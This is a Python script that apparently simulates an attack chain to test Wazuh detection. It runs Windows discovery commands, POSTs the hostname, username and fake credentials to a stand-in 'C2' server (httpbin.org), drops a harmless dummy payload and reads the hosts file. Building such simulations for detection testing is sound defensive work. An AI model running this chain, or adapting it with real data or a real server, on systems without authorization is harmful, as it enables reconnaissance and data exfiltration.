import os
import subprocess
import requests
import time
import sys
import ctypes

C2_SERVER = "http://httpbin.org/post"

def print_banner(phase_name):
    print(f"\n{'='*60}")
    print(f"ATTACK PHASE: {phase_name}")
    print(f"{'='*60}")
    
def run_command(cmd, description):
    print(f"[>] Action: {description}")
    print(f"Command: {cmd}")
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] Status: Success")
        return True
    except subprocess.CalledProcessError:
        print("[-] Status: Failed")
        return False
    
def phase_discovery():
    print_banner("1. Discovery")
    actions = [
        ("whoami /all", "Get current user and privileges"),
        ("net user", "List local users"),
        ("net localgroup administrators", "List local administrators"),
        ("ipconfig /all", "Get network configuration"),
        ("tasklist", "List running processes")
    ]
    for cmd, desc in actions:
        run_command(cmd, desc)
        time.sleep(1)
        
def phase_exfiltration():
    print_banner("2. Exfiltration")
    data = {
        "hostname": os.getenv("COMPUTERNAME"),
        "user": os.getenv("USERNAME"),
        "stolen_password": "Flag{Wazuh_Detect_This}",
        "credit_card": "4444-5555-6666-7777"
    }
    print(f"[>] Exfiltrating data to C2 server: {C2_SERVER}")
    try:
        resp = requests.post(C2_SERVER, json=data, timeout=5)
        if resp.status_code == 200:
            print("[+] Data exfiltration successful")
        else:
            print(f"[-] Data exfiltration failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Data exfiltration failed: {e}")
        
def phase_persistence():
    print_banner("3. Persistence")
    temp_dir = os.getenv("TEMP")
    malware_path = os.path.join(temp_dir, "malicious_payload.exe")
    print(f"[>] Dropping malicious payload to {malware_path}")
    try:
        with open(malware_path, "wb") as f:
            f.write(b"Not real malware, just a test file")
        print("[+] Payload dropped successfully")
        time.sleep(2)
        os.remove(malware_path)
        print("[i] Payload removed after execution")
    except Exception as e:
        print(f"[-] Failed to drop payload: {e}")
        
def trigger_alert_simulation():
    print_banner("4. Trigger Alert Simulation")
    print("[>] Touching sensitive file to trigger alert")
    cmd = "type C:\\Windows\\System32\\drivers\\etc\\hosts"
    run_command(cmd, "Access sensitive file")
    
if __name__ == "__main__":
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        
    print(f"\n[+] Status Permission: {'Administrator' if is_admin else 'Standard User'}")
    phase_discovery()
    time.sleep(1)
    phase_exfiltration()
    time.sleep(1)
    phase_persistence()
    time.sleep(1)
    trigger_alert_simulation()
    print("\n[+] Attack simulation completed.")